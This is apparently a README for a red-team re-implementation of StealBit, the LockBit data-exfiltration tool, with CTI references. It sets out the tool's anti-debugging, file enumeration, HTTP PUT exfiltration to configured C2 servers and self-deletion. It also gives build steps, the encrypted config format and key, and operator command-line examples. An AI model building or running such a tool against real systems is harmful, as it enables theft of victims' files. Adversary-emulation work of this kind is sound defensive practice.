# StealBit

StealBit is an exfiltration tool used to exfiltrate both files and directories over a custom C2 channel.

## Features

StealBit utilizes native APIs and threading to optimize execution and exfiltration of files. It performs the following behaviors:

- Checks if being debugged and infinitely loops
- Recursively enumerates folders and files, avoiding [deny-list items](src/enumerate.cpp#L127-L242)
- Checks C2 server connectivity using an HTTP GET request
- Exfiltrates files using HTTP PUT requests
- Deletes itself on completion

## Build

StealBit can be built in Debug or Release mode using the included
`CMakePreset.json` configurations.

### Dependencies

- `CMake` version `3.26`
- `CMakePresets.json` version `6` support (Ninja Multi-Config)

### Quickstart

#### Command Line

Build both Debug and Release configurations of StealBit. This will also kick off the GoogleTest unit tests.

```PowerShell
cd Resources\Stealbit
cmake.exe --workflow --preset cicd-debug
cmake.exe --workflow --preset cicd-release
```

For simplicity, all of the generated artifacts can be bundled into the
top-level `install/` directory using the CMake installation facility.

```PowerShell
cmake.exe --install ./build --config release
cmake.exe --install ./build --config debug
```

You can then run StealBit from the command line:

```PowerShell
.\install\Debug\stealbit.exe

.\install\Release\stealbit.exe
```

#### Config File

Stealbit looks for a config file in the same directory as the binary. The final encrypted config file name should be `sb.enc`.

The contents should be: a malware identifier, and any number of C2 servers in the format `IPADDRESS:PORT`. Use `;` to delimit different configuration lines.
The config can handle unlimited C2 servers.

Example config file (decrypted):

```cpp
ID123;127.0.0.1:4444;10.1.10.1:56565
```

The config file `config\sb_NOT_ENCRYPTED.conf` will be automatically encrypted when Stealbit is built, and an updated `config\sb.conf` will be generated.

To manually encrypt the config, file use the accompanying application `stealbit-encrypt-config.exe [PATH TO CONFIG]`. The application will output an encrypted config file
that is encrypted with the key `0D00000D00000D00000D0000` (baby shark). The encrypted file name will be appended with `.enc`

#### Usage & Arguments

Stealbit has several command line arguments available to adjust the functionality of it.

- The first argument is standalone, and positional. This is the starting file, or directory. (defaults to `C:`; argument required to provide other arguments)
- `-f | -file (integer value)` - changes the maximum file size to exfiltrate. (Default file size max is 2MB)
- `-d | -delete` - toggles on/off self-delete. (Self-delete disabled by default)
- `-allowallext` - tells Stealbit to ignore the extension blacklist. (Default is to use the blacklist)
- `-allowalldir` - tells Stealbit to ignore the directory blacklist. (Default is to use the blacklist)

Example 1 (start in Users/Public; enabled self delete; max file size is 3MB):

```cmd
stealbit.exe C:\Users\Public -d -f 30000 
```

Example 2 (start in C:; ignore directory blacklist; use default max file size):

```cmd
stealbit.exe C: -allowalldir
```

Example 3 (start in C:; ignore directory blacklist; use default max file size):

```cmd
stealbit.exe
```

### Cleanup

To remove Stealbit you need to remove the binary and the config file. You can do this using `Remove-Item`.

```PowerShell
Remove-Item -Path C:\Users\[USERNAME]\AppData\Local\Temp\connhost.exe
Remove-Item -Path C:\Users\[USERNAME]\AppData\Local\Temp\SB.conf
```

## Install

Installing StealBit simply copies all of the artifacts from both Release
and Debug builds into the top-level `install/` directory. This is simply for
ease of use and distributability.

The final product should be a top-level directory named `install/` with the
following layout:

```PowerShell

sdbot/
├─ install/
   ├─ Debug/
   │  ├─ main.exe
   │  ├─ main.pdb
   ├─ Release/
      ├─ main.exe
```

## Test 🧪

### Unit Tests

GoogleTest unit tests will automatically run when using the `cicd-debug` and `cicd-release` presets

You can also run them ad-hoc by running:

```PowerShell
ctest.exe --preset all
```

## Troubleshoot

### Logs

For operator usability, StealBit will log XOR-encrypted and base64-encoded logs to `stb.log`
in the current working directory. The current XOR key is `000102030405060708090a0b0c0d0e0f000102030405060708090a0b0c0d0e0f`

You can decrypt these logs using the [log_decryptor](../log_decryptor/):

```bash
python3 aes_base64_log_decryptor.py --xor -i stb.log  -o decrypted.log -k `000102030405060708090a0b0c0d0e0f`
```

### Exfiltration Testing

A python script was created that can be used to test exfiltration. The script will help to determine if headers, file data, and other
request information algins with expectation.

You can access this script here: [Python PUT Server](scripts/http_server.py):

```bash
python3 http_server.py -b 127.0.0.1 8001
```

## CTI

1. [Archive.org](https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf)
1. [Cyber Reason](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool)
1. [Yoroi](https://yoroi.company/en/research/hunting-the-lockbit-gangs-exfiltration-infrastructures/)
1. [cyware](https://cyware.com/news/analyzing-lockbits-data-exfiltration-model-f5950c8a)
